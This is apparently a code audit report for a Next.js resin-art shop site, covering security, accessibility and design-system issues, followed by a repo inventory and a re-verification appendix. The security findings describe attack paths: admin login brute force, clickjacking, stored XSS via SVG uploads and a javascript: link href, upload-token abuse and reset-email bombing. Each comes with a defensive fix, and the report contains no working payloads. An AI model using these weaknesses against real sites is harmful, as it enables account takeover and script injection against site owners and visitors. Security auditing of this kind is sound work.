#### [A11Y-009] Announcement-bar / header ink uses 72-75% opacity for 13px text over variable backgrounds
- **Severity:** Polish
- **Effort:** S
- **Location:** `src/components/layout/announcement-bar.tsx:28; src/app/globals.css:53,80; src/components/layout/dynamic-header.tsx:43-49`
- **Observation:** The announcement strip and nav links render 13px/text-sm in --header-ink-soft = rgba(porcelain,0.72-0.75) or rgba(midnight,0.72). Because the header is transparent over the hero and the ink is swapped by an IntersectionObserver against arbitrary section imagery/gradients, contrast of this small soft text cannot be guaranteed at section boundaries.
- **Impact:** Small secondary text at ~72% opacity over gradient/photographic hero sections can dip below 4.5:1 during and after ink transitions (WCAG 1.4.3), though adaptive ink mitigates common cases.
- **Recommendation:** Raise soft-ink opacity toward 0.85 for the 13px announcement text, or add a subtle text scrim behind header content over hero imagery so soft ink always clears 4.5:1.
- **Status:** Unverified

### Security (SEC)

#### [SEC-001] No security headers anywhere (CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy)
- **Severity:** Major
- **Effort:** M
- **Location:** `next.config.ts:1-21 (no headers() function; no middleware header injection in src/middleware.ts)`
- **Observation:** next.config.ts defines only serverActions.bodySizeLimit and images.remotePatterns. There is no async headers() block and src/middleware.ts sets no response headers. Confirmed by reading both files end to end. The site loads a third-party module script from https://w.behold.so/widget.js (src/components/sections/instagram-feed.tsx:18-21) with no Content-Security-Policy constraining it.
- **Impact:** The /studio admin can be framed (clickjacking to trigger destructive server actions via a logged-in admin). Absent X-Content-Type-Options MIME sniffing is possible on user-served files. Absent CSP, any reflected/stored HTML (see SEC-004/SEC-006) or a compromised Behold CDN executes with full privileges and can exfiltrate the JWT-bearing session. No HSTS means TLS downgrade exposure.
- **Recommendation:** Add an async headers() to next.config.ts (or set them in middleware for /studio) returning at minimum: Strict-Transport-Security max-age=63072000; includeSubDomains; preload, X-Frame-Options: DENY (and frame-ancestors 'none' in CSP) on /studio, X-Content-Type-Options: nosniff, Referrer-Policy: strict-origin-when-cross-origin, Permissions-Policy disabling unused features, and a Content-Security-Policy that whitelists self, res.cloudinary.com, *.public.blob.vercel-storage.com and w.behold.so/behold.so for the widget while forbidding inline script (use nonces for the JSON-LD block).
- **Status:** Verified

#### [SEC-002] No rate limiting or lockout on /studio credentials login — brute-forceable single admin account
- **Severity:** Major
- **Effort:** M
- **Location:** `src/lib/auth.ts:39-58 (Credentials.authorize); src/middleware.ts:12-38`
- **Observation:** The Credentials provider authorize() does a bcrypt compare with no attempt counter, no per-IP throttle, and no lockout (grep for rateLimit/attempt/lockout in auth.ts returns nothing). The public rate limiter (src/lib/rate-limit.ts) is used for contact/order/multipart-upload but never wired into the login POST. The system is designed around one ADMIN account with only an 8-char minimum password (src/actions/auth-public.ts:44).
- **Impact:** An attacker can run unlimited online password guesses against the known admin email (ADMIN_EMAIL is in .env.example and the owner email is public). A single compromise yields full studio control (products, blog, users, exports).
- **Recommendation:** Wrap the authorize() lookup in a per-IP + per-email rate limit (reuse rateLimit) that returns null after e.g. 5 failures/15 min, and add exponential backoff or a temporary account lock in the User row after N consecutive failures. Consider raising the password minimum and adding a NextAuth events.signIn failure counter persisted in the DB so it survives cold starts.
- **Status:** Verified

#### [SEC-003] SVG accepted by the studio media library → stored XSS when served same-origin
- **Severity:** Major
- **Effort:** S
- **Location:** `src/lib/storage.ts:80-90 (ACCEPTED_UPLOAD_TYPES includes 'image/svg+xml'); src/app/uploads/[...path]/route.ts:13,38-43 serves .svg as image/svg+xml inline; consumed by src/actions/media.ts:60`
- **Observation:** uploadMediaFiles accepts any type present in ACCEPTED_UPLOAD_TYPES, which includes image/svg+xml. The local uploads route returns the file with Content-Type image/svg+xml and no Content-Disposition/CSP, so the browser renders it inline. SVG files can embed <script>/onload handlers that execute in the serving origin.
- **Impact:** A malicious or compromised EDITOR can upload an SVG containing JavaScript; opening/hot-linking that media URL executes script. In production media lives on *.public.blob.vercel-storage.com (a separate origin, so session cookies are isolated), but in dev and anywhere the file is proxied same-origin it is a stored XSS. It also broadens the impact of the missing CSP (SEC-001).
- **Recommendation:** Drop image/svg+xml from ACCEPTED_UPLOAD_TYPES, or if SVG is required, sanitize with DOMPurify (profile SVG) on upload and always serve user SVGs with Content-Disposition: attachment and Content-Security-Policy: default-src 'none'; sandbox. Add the same nosniff/attachment headers to the uploads/[...path] route.
- **Status:** Verified

#### [SEC-004] Public Vercel Blob upload token endpoint has no rate limit or abuse control
- **Severity:** Major
- **Effort:** S
- **Location:** `src/app/api/upload/route.ts:25-74 (handleBlobClientUpload)`
- **Observation:** POST /api/upload is intentionally public for the WhatsApp reference-image forms. The multipart fallback path is rate-limited (line 80), but the primary production path — handleBlobClientUpload — issues scoped client upload tokens (allowedContentTypes/maximumSizeInBytes/refs prefix) with NO rate limiting, no honeypot, and no auth. onUploadCompleted is a no-op.
- **Impact:** Any anonymous client can request unlimited upload tokens and push up to 5MB files (x5) into the Blob store indefinitely, driving storage/bandwidth cost and creating an unbounded pool of attacker-controlled files under refs/. The path-prefix check limits location but not volume.
- **Recommendation:** Apply the same rateLimit(`upload:${ip}`) guard at the top of POST before both branches (not only the fallback), keyed on x-forwarded-for; optionally require the honeypot/formStartedAt spam signals the order forms already collect, and add a small daily cap per IP.
- **Status:** Verified

#### [SEC-009] Previously-exposed Resend key and Google service-account JSON require rotation (repo is clean, secret is not)
- **Severity:** Major
- **Effort:** S
- **Location:** `.env (gitignored, verified untracked); .env.example:7-13 documents RESEND_API_KEY and GOOGLE_SERVICE_ACCOUNT_JSON; git history checked`
- **Observation:** Verified .env is gitignored and was never committed (git log --all -- .env is empty), and a scan of full git history for secret value patterns (re_ keys, private_key JSON values) found only source-code field-name references, not real secrets. So the repo does not currently leak them. However recon states a Resend API key and a Google service-account JSON were exposed in a prior chat and flagged for rotation — that exposure lives outside the repo and cannot be undone by git hygiene.
- **Impact:** If the exposed Resend key is still live it permits sending mail as the studio domain (phishing/reputation). A live Google service-account JSON grants programmatic access to the configured Sheet(s) and whatever scopes the account holds — potentially broad.
- **Recommendation:** Rotate both credentials at the provider (issue a new Resend key, revoke the old; generate a new Google service-account key and delete the leaked one) and update the Vercel environment variables. Confirm the old key/key-id no longer authenticates. I cannot verify rotation status from the repo — treat as open until confirmed in Resend/GCP consoles.
- **Status:** Unverified

#### [SEC-005] In-memory rate limiter is per-instance and resets on cold start — weak on serverless
- **Severity:** Minor
- **Effort:** M
- **Location:** `src/lib/rate-limit.ts:8-42; consumers src/actions/public.ts:51, src/actions/order.ts:93,204, src/app/api/upload/route.ts:80`
- **Observation:** rateLimit uses a module-level Map. On Vercel each concurrent lambda instance holds its own Map and instances are recycled frequently, so the effective limit multiplies by instance count and resets on every cold start. The code comment acknowledges this ('resets on cold start, which is acceptable').
- **Impact:** Contact-form / custom-order spam protection is materially weaker than the configured 5-per-10-min: an attacker spreading requests across instances or forcing cold starts can substantially exceed the limit. Combined with SEC-002 this also means any login throttle built the same way would be bypassable.
- **Recommendation:** Given the no-paid-service constraint the honeypot+fill-time checks remain the real defense, so this is acceptable for the contact funnel — but document it explicitly and, for anything security-sensitive (login, password reset, token issuance), back the limiter with a durable store (Vercel KV/Upstash free tier, or a small DB table keyed by ip+window) so counts survive across instances and cold starts.
- **Status:** Verified

#### [SEC-006] Rendered Tiptap content is not sanitized — javascript: link hrefs become stored XSS via dangerouslySetInnerHTML
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/lib/tiptap-render.ts:9-45 (generateHTML, no sanitize); rendered at src/app/(public)/blog/[slug]/page.tsx:181,297 and privacy/terms pages (src/app/(public)/privacy/page.tsx:54, terms/page.tsx:54)`
- **Observation:** renderTiptapToHtml calls @tiptap/html generateHTML on stored JSON and returns the raw string for dangerouslySetInnerHTML. @tiptap/html serializes nodes/marks faithfully and does not strip dangerous URL schemes; Link.configure({openOnClick:false}) does not sanitize href. The content is authored via the studio rich-text editor by ADMIN/EDITOR, so the trust boundary is staff — but EDITOR is a lower-trust role than ADMIN.
- **Impact:** A malicious or compromised EDITOR can store a link with href="javascript:..." (or otherwise abuse the mark serialization) that executes in public visitors' browsers when clicked — stored XSS with public blast radius, made worse by the absent CSP (SEC-001). Image src is schema-constrained so the primary vector is link hrefs.
- **Recommendation:** Run the generateHTML output through DOMPurify (server build) in renderTiptapToHtml before returning, and/or constrain the Link extension with validate/protocols to http/https/mailto/tel only, rejecting javascript:/data:. This keeps admin authoring intact while closing the scheme-injection path.
- **Status:** Verified

#### [SEC-007] Password-reset request endpoint has no rate limit — enables reset-email bombing and token churn
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/actions/auth-public.ts:103-132 (requestPasswordReset)`
- **Observation:** requestPasswordReset validates the email and, if a user exists, generates a new reset token and sends an email — with no rate limiting, honeypot, or throttle. The non-enumeration design (always redirect ?sent=1) is good, but nothing caps how often it can be invoked.
- **Impact:** An attacker who knows/guesses a staff email (the owner email is public) can repeatedly trigger reset emails (email bombing / Resend quota abuse) and continuously rotate the victim's reset token. Low direct compromise risk but a real abuse/DoS-of-inbox vector.
- **Recommendation:** Apply rateLimit(`pwreset:${ip}`) and optionally a per-email cooldown (e.g. don't regenerate if an unexpired token already exists) before issuing a token/email in requestPasswordReset.
- **Status:** Verified

#### [SEC-008] Scraper CSV export authorizes on any authenticated session, not the staff role guard
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/app/api/scraper/export/route.ts:31-34`
- **Observation:** The export handler checks only `if (!session?.user)` rather than using requireStaff([ADMIN,EDITOR]) like every server action in src/actions/*. Functionally equivalent today because only staff can obtain a session (credentials-only, staff-only), but it diverges from the codebase's role-checked pattern and would silently permit any future non-staff session type.
- **Impact:** Low today; a defense-in-depth / consistency gap. Any authenticated principal can pull up to 5000 scraped-product rows regardless of role.
- **Recommendation:** Replace the inline check with the shared requireStaff() guard (wrap in try/catch to return 401/403), so the route inherits the same ADMIN/EDITOR policy as the rest of the studio surface.
- **Status:** Verified

#### [SEC-010] WhatsApp inquiry funnel: reference-image URLs and free-text flow into DB/WhatsApp payload without content policy beyond type/size
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/actions/public.ts:64-86 (whatsappMessage assembly); src/actions/order.ts (referenceImageUrls persisted); src/app/api/upload/route.ts:49 (refs/ prefix only)`
- **Observation:** The contact/order actions validate name/phone/message with zod and build a WhatsApp deep-link message, and persist referenceImageUrls from the public upload endpoint. Upload validates type/size and pins the refs/ prefix, but the persisted URLs are attacker-influenceable (client supplies the completed Blob URL in the order action) and the assembled whatsappMessage concatenates user text directly.
- **Impact:** Low: the WhatsApp payload is plain text (no injection sink), but an attacker could submit arbitrary refs/ Blob URLs (or URLs the order action doesn't re-validate against the Blob store) that staff then open from the studio inbox. Worth confirming the order action validates that referenceImageUrls actually point at the expected Blob host before storing/displaying.
- **Recommendation:** In submitProductOrder/submitCustomOrder, validate each referenceImageUrl against an allowlist host (*.public.blob.vercel-storage.com or /uploads/refs) with zod .url() + host check before persisting, and render them in the studio inbox as download links / with rel=noopener rather than auto-loading, so a poisoned URL can't be used to attack staff.
- **Status:** Unverified

### Design System (DS)

#### [DS-001] Hardcoded gold text color #8a6d1a fails WCAG AA contrast on the all-dark public canvas
- **Severity:** Major
- **Effort:** S
- **Location:** `src/components/ui/badge.tsx:14 (also src/app/(public)/product/[slug]/page.tsx:252)`
- **Observation:** badge.tsx line 14 sets the `gold` variant to `border-gold/50 bg-gold/10 text-[#8a6d1a]`, a dark brown-gold. The public site renders inside a global `.dark` wrapper (src/app/(public)/layout.tsx:44), and Section tones resolve to dark surfaces (`ice`->bg-card = #101319). The homepage renders `<Badge variant="gold">Made in India</Badge>` on such a section (src/app/(public)/page.tsx:566). Computed contrast of #8a6d1a on #101319 ≈ 3.3:1 with the gold/10 tint, ~3.76:1 on bare card — below the 4.5:1 AA threshold. The same value is used for the DRAFT-preview banner (product/[slug]/page.tsx:252).
- **Impact:** The premium gold 'Made in India' badge and draft banner read as a muddy low-contrast smear on the dark canvas and fail accessibility. #8a6d1a was chosen for a LIGHT surface (it still works in the studio, which stays on the light :root theme) but the public site pivoted to all-dark, inverting the intended relationship.
- **Recommendation:** Introduce a theme-aware token: add `--gold-ink: #8a6d1a;` under `:root` and `--gold-ink: #e3c56a;` (a light gold clearing 4.5:1 on #101319) under `.dark` in globals.css, expose it as `--color-gold-ink` in `@theme inline`, then replace every `text-[#8a6d1a]` with `text-gold-ink`. Verify with a contrast checker on bg-card.
- **Status:** Verified

#### [DS-002] Section `headerTheme` prop is REQUIRED but ignored, leaving the DynamicHeader's dark-ink system unreachable dead code
- **Severity:** Major
- **Effort:** M
- **Location:** `src/components/layout/section.tsx:41 and :44`
- **Observation:** Section declares `headerTheme: 'dark' | 'light'` as a required prop, then discards it with `void headerTheme;` (line 41) and hardcodes `data-header-theme="dark"` on every band (line 44). DynamicHeader keys its ink entirely off that attribute (`themeToInk`, dynamic-header.tsx:38-39), so it can only ever compute `light` ink. The `INK_VARS.dark` / `SURFACE.dark` branches (dynamic-header.tsx:46-49, 61-65) and much of the ~80-line IntersectionObserver ink-swap machinery are now unreachable on the public site.
- **Impact:** Every call site is forced to pass a meaningless `headerTheme="light"/"dark"` (dozens of pages) that does nothing — a misleading API that invites bugs and wastes reviewer attention. A large, sophisticated header subsystem is dead weight shipping to users. Future devs will 'fix' ink by editing headerTheme and see no effect.
- **Recommendation:** Decide the model: if the site is permanently all-dark, drop `headerTheme` from SectionProps, remove the dead INK_VARS.dark/SURFACE.dark branches and the observer's theme-swap logic, and hardcode light ink. If light bands are still intended, restore `data-header-theme={headerTheme === 'light' ? 'light' : 'dark'}` so the prop is honored again.
- **Status:** Verified

#### [DS-003] Section tone token names no longer describe what they render (semantic drift)
- **Severity:** Major
- **Effort:** M
- **Location:** `src/components/layout/section.tsx:6-13`
- **Observation:** TONE_CLASSES maps `porcelain -> bg-background text-foreground` and `ice -> bg-card text-foreground`. Under the public `.dark` wrapper, `--background` = #0a0a0a (rich black) and `--card` = #101319 (dark panel). So `tone="porcelain"` paints rich black and `tone="ice"` paints a dark panel — the exact opposite of the light off-white/blue-tint the names promise (and the comment at line 3 admits 'Names kept so call sites don't need touching'). Call sites like product/[slug]/page.tsx:247 pass `tone="porcelain"` believing they get a light band.
- **Impact:** The token vocabulary actively lies to every developer reading a page file, making it impossible to reason about a page's appearance from its markup. This is the root cause that made DS-001's hardcoded gold text look correct in review yet fail in production.
- **Recommendation:** Rename tones to describe the actual surface (e.g. `base`, `panel`, `deep`, `void`) with a codemod across call sites, OR add genuinely light tones and re-map. At minimum, keep the CSS-variable indirection so `bg-background`/`bg-card` remain the single source of truth and never reintroduce a raw light hex assuming these are light.
- **Status:** Verified

#### [DS-004] No `gold-ink` token: dark-gold #8a6d1a duplicated as a raw hex across 5 files
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/components/ui/badge.tsx:14, src/app/(public)/product/[slug]/page.tsx:252, src/components/studio/products/product-form.tsx:370, src/components/studio/scraper/add-to-catalog-dialog.tsx:177, src/components/studio/scraper/approve-import-dialog.tsx:178`
- **Observation:** The design system defines exactly one metallic (`--gold: #d4af37`) but that value is too light to use as text on tinted backgrounds, so a second, undocumented gold `#8a6d1a` was invented ad hoc and copy-pasted as `text-[#8a6d1a]` in five components with no token backing it.
- **Impact:** Token-discipline violation: a real brand color exists only as a scattered magic hex, so it can drift, cannot be themed (see DS-001), and isn't discoverable. A future palette change to gold will miss these.
- **Recommendation:** Promote it to `--gold-ink` (see DS-001), add it to the palette comment block in globals.css alongside `--gold`, and replace all five `text-[#8a6d1a]` occurrences with `text-gold-ink`.
- **Status:** Verified

#### [DS-005] The `.eyebrow` utility is bypassed with an inline arbitrary-value clone in 5 places, dropping its font-weight
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/app/(public)/page.tsx:464, :494, :599 (also src/app/(public)/error.tsx:49, src/app/(public)/not-found.tsx:46)`
- **Observation:** globals.css:237 defines an `eyebrow` utility (font 0.8125rem, weight 550, letter-spacing 0.18em, lowercase, azure) and it is correctly used in ~60 places. Yet these 5 spots reimplement it inline as `text-[13px] lowercase tracking-[0.18em] text-azure`, which omits `font-weight: 550` and re-expresses 0.8125rem as 13px.
- **Impact:** Inconsistent eyebrow weight between most of the site and these hero/error labels, plus duplicated magic values that will drift from the utility. Classic accumulated design debt.
- **Recommendation:** Replace the 5 inline clusters with `className="eyebrow"` (append `text-center` etc. as needed). If a variant weight is intentional, add an `eyebrow-strong` utility rather than hardcoding.
- **Status:** Verified

#### [DS-006] Off-white and richest-black values drift outside the token layer (three off-whites, an untokenized near-black)
- **Severity:** Minor
- **Effort:** M
- **Location:** `src/components/layout/dynamic-header.tsx:44 & :63, src/app/opengraph-image.tsx:33/40, src/app/(public)/product/[slug]/opengraph-image.tsx:73, src/app/global-error.tsx:18-19`
- **Observation:** `--porcelain` is #f8f9fa, but the header ink and glass surfaces use `rgba(247,247,244,...)` = #F7F7F4 (dynamic-header.tsx:44,63), OG images and global-error also use #F7F7F4, and order-panel's 'white' swatch is #f4f4f1 — three different off-whites. Likewise the richest black #05080F appears in `glass-dark` (globals.css:268), all OG images, and global-error.tsx:18, none of which reference the `--void` #0a0a0a token.
- **Impact:** Brand neutrals are not single-sourced; the near-white/near-black used on shared chrome (header, error page, social share cards) can visibly diverge from the porcelain/void tokens. Note: OG images (Satori) and global-error legitimately cannot read CSS variables, so those are partly justified — but the header inline styles are not.
- **Recommendation:** Align dynamic-header.tsx:44/63 to `var(--porcelain)` / porcelain-derived rgba. For the edge/OG/global-error files, centralize the raw hexes in a shared TS constants module (e.g. lib/brand-colors.ts) mirroring the CSS tokens so both layers change together, and reconcile #05080F vs #0a0a0a into one 'void' value.
- **Status:** Verified

#### [DS-007] WhatsApp brand green #25D366 hardcoded, and the floating CTA uses a different color language than every other WhatsApp CTA
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/components/layout/floating-whatsapp.tsx:43`
- **Observation:** The floating funnel button is `bg-sapphire ... hover:bg-[#25D366]` — a raw WhatsApp-green hex with no token. Meanwhile the header CTA (dynamic-header.tsx:343) and hero CTA (home-hero.tsx:89) both render 'Start on WhatsApp' as `variant="outline"` (sapphire), and the primary Button default is gold-on-void. So the single most important conversion element has a third, unshared visual treatment (blue->green).
- **Impact:** On a WhatsApp-only funnel this floating button is the money element; its color story is disconnected from the rest of the CTA system and the green is an untokenized magic value. Inconsistent CTA language slightly weakens the funnel's perceived cohesion.
- **Recommendation:** Add a `--whatsapp: #25D366` token to the palette and reference it as `hover:bg-whatsapp`. Then deliberately decide the CTA hierarchy — either make the floating button match the gold primary Button, or document the green as the intentional 'live chat' accent and apply it consistently (e.g. the footer 'Chat on WhatsApp' link).
- **Status:** Verified

#### [DS-008] Studio table-header styling duplicated verbatim ~15 times instead of a shared primitive
- **Severity:** Minor
- **Effort:** M
- **Location:** `src/components/studio/products/product-list.tsx:215 (and ~14 more: page-list.tsx:80, faq-list.tsx:220, inquiry-list.tsx:196, activity/page.tsx:115, portfolio-list.tsx:168, testimonial-list.tsx:341, category-list.tsx:266, blog-post-list.tsx:164, etc.)`
- **Observation:** The identical class string `border-b border-foreground/8 text-left text-[11px] uppercase tracking-wider text-muted-foreground` is copy-pasted onto the header `<tr>` of roughly fifteen studio list tables, with `text-[11px]` as an arbitrary value each time.
- **Impact:** Component-API gap / design debt: any change to the studio table-header treatment (size, tracking, border alpha) requires editing ~15 files, and the arbitrary `text-[11px]` and `border-foreground/8` will inevitably drift between tables.
- **Recommendation:** Extract a tiny `<StudioTableHead>` (or a `table-head-row` @utility / shared className constant) and reuse it across the studio lists; promote `text-[11px]` to a named `text-micro` utility if this size recurs intentionally.
- **Status:** Verified

#### [DS-009] order-panel re-hardcodes the brand palette (blue/navy/azure/gold/ocean) as raw hex, duplicating the token layer
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/components/product/order-panel.tsx:66-99 (also fallback #0f52ba at :107)`
- **Observation:** SWATCH_COLORS is a name->hex lookup for product color previews that re-hardcodes the exact brand tokens: blue #0f52ba (== --sapphire), navy #0a1a2f (== --midnight), azure #3b82f6 (== --azure), ocean #0e3a53 (== --deep-ocean), gold #d4af37 (== --gold), and the fallback returns #0f52ba. These duplicate globals.css values with no linkage.
- **Impact:** If the brand blue ever shifts, the swatch preview silently diverges from the rest of the UI. Most of the ~50 entries are genuine non-brand product colors (fine as data), but the brand ones should not be a second copy.
- **Recommendation:** For the entries that mirror brand tokens, read them from a shared TS constants module (or `getComputedStyle` of the CSS var at runtime is overkill — a small shared map is enough) so brand blue/navy/gold have one source. Leave the non-brand swatch names as literal data.
- **Status:** Verified

#### [DS-010] Footer social presence is a dead placeholder link, undermining brand/funnel completeness
- **Severity:** Polish
- **Effort:** S
- **Location:** `src/components/layout/footer.tsx:34 (also page.tsx sameAs TODO)`
- **Observation:** The footer Instagram anchor is `href="#"` with a TODO (footer.tsx:32-34), and the Organization JSON-LD `sameAs` array is empty with a TODO (src/app/(public)/layout.tsx). The Instagram feed section also renders 'follow along on instagram' (page.tsx:757).
- **Impact:** A luxury brand shipping a live Instagram icon that navigates nowhere reads as unfinished and erodes trust at a funnel touchpoint; empty `sameAs` also weakens brand entity SEO. Low severity because it's a placeholder, not a breakage.
- **Recommendation:** Either wire the real Instagram/social URLs (and populate JSON-LD `sameAs`) or conditionally hide the social icons and the Instagram section until handles exist, so no dead luxury-brand link ships.
- **Status:** Verified

## Appendix A — Repo Inventory

**Resolved stack (verified against repo — corrects the audit brief's "Next 15/Framer Motion" assumptions):**
- Next.js **16.2.10** (App Router) · React **19.2.4** · TypeScript ^5
- Prisma **7.8** + Postgres (Neon in prod, `@prisma/adapter-pg`)
- Auth.js v5 (`next-auth@5.0.0-beta.31`) — **JWT sessions**, edge middleware (`/studio/:path*`), no DB adapter
- Tailwind **v4** + in-repo shadcn/ui · **motion v12** (Framer Motion pkg) + GSAP 3.15 + Lenis 1.3 · React Three Fiber 9 + drei 10 + three 0.185
- zod 4 · @vercel/blob 2.5 · @vercel/analytics 2 + @vercel/speed-insights 2 · Resend **REST** (no SDK) · bcryptjs

**Prisma models (24):** User, Category, Product, ProductImage, CustomizationField, Inquiry, Portfolio, PortfolioImage, BlogCategory, Tag, BlogPost, Testimonial, Faq, Media, Page, SiteSettings, ActivityLog, ScrapeSource, ScrapeJob, ScrapedProduct (+ enums Role, ContentStatus, FieldType, InquirySource/Status, MediaType, ScrapeTier/Platform/JobStatus/ReviewStatus).

**Routes:**

```
(public)/about/page.tsx
(public)/blog/[slug]/opengraph-image.tsx
(public)/blog/[slug]/page.tsx
(public)/blog/page.tsx
(public)/contact/page.tsx
(public)/custom-order/page.tsx
(public)/faq/page.tsx
(public)/page.tsx
(public)/portfolio/[slug]/page.tsx
(public)/portfolio/page.tsx
(public)/privacy/page.tsx
(public)/process/page.tsx
(public)/product/[slug]/opengraph-image.tsx
(public)/product/[slug]/page.tsx
(public)/search/page.tsx
(public)/shop/[category]/page.tsx
(public)/shop/page.tsx
(public)/terms/page.tsx
(public)/whatsapp-order/page.tsx
(public)/workshops/page.tsx
api/auth/[...nextauth]/route.ts
api/scraper/export/route.ts
api/upload/route.ts
manifest.ts
opengraph-image.tsx
robots.ts
sitemap.ts
studio/(dashboard)/activity/page.tsx
studio/(dashboard)/blog/[id]/page.tsx
studio/(dashboard)/blog/new/page.tsx
studio/(dashboard)/blog/page.tsx
studio/(dashboard)/categories/page.tsx
studio/(dashboard)/faqs/page.tsx
studio/(dashboard)/import/page.tsx
studio/(dashboard)/inquiries/[id]/page.tsx
studio/(dashboard)/inquiries/page.tsx
studio/(dashboard)/media/page.tsx
studio/(dashboard)/page.tsx
studio/(dashboard)/pages/[id]/page.tsx
studio/(dashboard)/pages/new/page.tsx
studio/(dashboard)/pages/page.tsx
studio/(dashboard)/portfolio/[id]/page.tsx
studio/(dashboard)/portfolio/new/page.tsx
studio/(dashboard)/portfolio/page.tsx
studio/(dashboard)/products/[id]/page.tsx
studio/(dashboard)/products/new/page.tsx
studio/(dashboard)/products/page.tsx
studio/(dashboard)/scraper/page.tsx
studio/(dashboard)/scraper/review/page.tsx
studio/(dashboard)/scraper/sources/[key]/page.tsx
studio/(dashboard)/scraper/sources/page.tsx
studio/(dashboard)/seo/page.tsx
studio/(dashboard)/settings/page.tsx
studio/(dashboard)/testimonials/page.tsx
studio/(dashboard)/users/page.tsx
studio/forgot-password/page.tsx
studio/login/page.tsx
studio/reset-password/page.tsx
studio/signup/page.tsx
uploads/[...path]/route.ts
```

## Appendix B — Build / Lint / Lighthouse Output

- `tsc --noEmit`: **clean** (0 errors).
- `next build`: **passes** (Compiled successfully).
- `eslint .`: **6 warnings, 0 errors** — 5× `react-hooks/incompatible-library` (React-Hook-Form `watch()` cannot be memoized), 1× `@typescript-eslint/no-unused-vars`.
- Lighthouse / Core Web Vitals: **not run** (no runtime env in the audit sandbox); PERF findings reasoned from code + build output and marked Unverified where runtime-only.

_ESLint tail:_
```
  111:26  warning  Compilation Skipped: Use of incompatible library

This API returns functions which cannot be memoized without leading to stale UI. To prevent this, by default React Compiler will skip memoizing this component/hook. However, you may see issues if values from this API are passed to other components/hooks that are memoized.

/home/user/ResinRiva2.0/src/components/studio/settings/settings-form.tsx:111:26
  109 |   });
  110 |
> 111 |   const whatsappNumber = watch("whatsappNumber");
      |                          ^^^^^ React Hook Form's `useForm()` API returns a `watch()` function which cannot be memoized safely.
  112 |
  113 |   async function onSubmit(values: FormValues) {
  114 |     setSaving(true);  react-hooks/incompatible-library

✖ 6 problems (0 errors, 6 warnings)
```

---

# Appendix C — Master Audit Re-verification (2026-07-19)
_Re-audited: 2026-07-19 · Commit: 035b395 (branch `Main`) · Method: 8-lens panel re-audit of HEAD, adversarially verified (107 agents, 0 errors)_

> **Why this appendix exists.** The *ResinRiva 2.0 — Master Audit Document (FINAL)* handed over a canonical audit prompt, a 19-item consolidated findings register (Part 2), and a phased plan (Part 3). This appendix is the result of running that prompt against the **actual codebase at HEAD**, append-only: it (C.1) verifies each of the 19 register items against the code, (C.2) refreshes the status of every 2026-07-12 finding (`SEC-001…DS-010`) since a large remediation wave has since landed, and (C.3) records 61 **new** findings from a fresh 8-lens sweep, each independently adversarially re-verified. Sections 1–5 and Appendices A–B above are preserved unchanged; no existing ID is edited or reused.
>
> **Ground-truth correction (supersedes the master document's §0).** The master document's §0 "corrected ground truth" is itself wrong for this repository. Verified against git config, README, DEPLOYMENT, INSTALL, BACKUP, `.env.example` and `src/lib/constants.ts`: the repo is **`gondaliyabhavya70960/ResinRiva2.0`** (default branch **`Main`**, not `claude/epic-bell-dof5as`), the target host is **`store.bhavyagondaliya.co.in`** (not `shop.…`), there is no `ResinRivaNew` / `resin-riva-new.vercel.app` anywhere, the stack is **Next 16.2.10 / React 19.2.4 / Prisma 7.8 / Auth.js v5 beta**, middleware lives at **`src/middleware.ts`** (this repo did not adopt the `proxy.ts` rename), and the palette is the **"Midnight Sapphire"** dark theme (`sapphire / azure / gold / porcelain / midnight / deep-ocean / void`, public wrapped in `.dark`, `/studio` on light `:root`) — **not** the ivory/ink token set the master document describes. All findings below use the real repo identity and real tokens.

## C.0 Re-verification scorecard (HEAD)

Directional re-score reflecting the post-2026-07-12 remediation wave (57 of 76 prior findings fixed) offset by the 61 newly-surfaced findings below. New-finding counts are this sweep only (they do not include still-open prior findings). No Blockers or Criticals survived adversarial verification at HEAD.

| Lens | Prior score | HEAD re-score | New Major | New Minor | New Polish | Headline new issue |
|------|:-----------:|:-------------:|:---------:|:---------:|:----------:|--------------------|
| Security | 68 | **74** | 3 | 3 | 0 | EDITOR can rewrite the WhatsApp order number and hijack the funnel (SEC-105) |
| Marketing/CRO | 64 | **80** | 3 | 3 | 0 | Submitted orders fire no pixel Lead event; newsletter table has no admin surface (MKT-206/208) |
| Engineering | 77 | **75** | 3 | 7 | 0 | Declared ISR is inert — every catalog page renders dynamically (ENG/PERF) |
| SEO/AEO | 78 | **80** | 1 | 7 | 0 | Listings have no crawlable pagination past the first 12 products (SEO-502) |
| Performance | 63 | **73** | 3 | 3 | 0 | Post-hydration element-type flip tears down & re-fades the whole page (PERF-305) |
| Accessibility | 66 | **76** | 3 | 4 | 2 | CMS/legal prose links at 2.77:1; studio auth focus rings sub-3:1 (A11Y-403/404) |
| UI/UX | 74 | **77** | 5 | 4 | 0 | Inquiry "Open in WhatsApp" messages the studio's own number, not the customer (UIUX-604) |
| Design System | 63 | **78** | 2 | 3 | 2 | Light-theme utilities render black-on-black on the dark canvas (DS-702) |
| **Overall** | **70** | **77** | **23** | **34** | **4** | Strong remediation; new gaps cluster in authz, render-mode & studio resilience |

**Verification tally:** register (Part 2) — 3 Implemented, 14 Partial, 2 Adjusted; prior findings — 57 Fixed, 13 Partial, 5 Open, 1 not verifiable in-repo (SEC-009 key rotation is provider-side). Full detail in C.1/C.2.

## C.1 Register verification (master document Part 2 vs HEAD)

Each of the 19 consolidated register findings, checked against the code at HEAD. "Partial" means the headline concern is addressed but a residual remains (carried into the plan); "Adjusted" means the finding's premise does not hold for this repo.

| ID | Topic | Master-doc severity | Status at HEAD | Residual (if any) |
|----|-------|---------------------|----------------|--------------------|
| SEC-101 | Repo/branch/deploy identity | Critical | ✎ Adjusted | Doc-only cleanup, no code changes. |
| SEC-102 | Login/reset rate limiting | Blocker | ◑ Partial | Back only the security-sensitive limiter keys (login:email:*, login:ip:* in src/lib/auth.ts; pwreset:* in src/actions/auth-public.ts) with a durable store; public-form spam keys can stay in-memory. |
| SEC-103 | Security headers + CSP | Critical | ◑ Partial | Three-step path to close the gap, in-repo and Vercel-native. |
| SEC-104 | SVG/rich-text sanitisation | Critical | ✅ Implemented | — |
| MKT-201 | WhatsApp CTA click tracking | Critical | ◑ Partial | Two small residuals. |
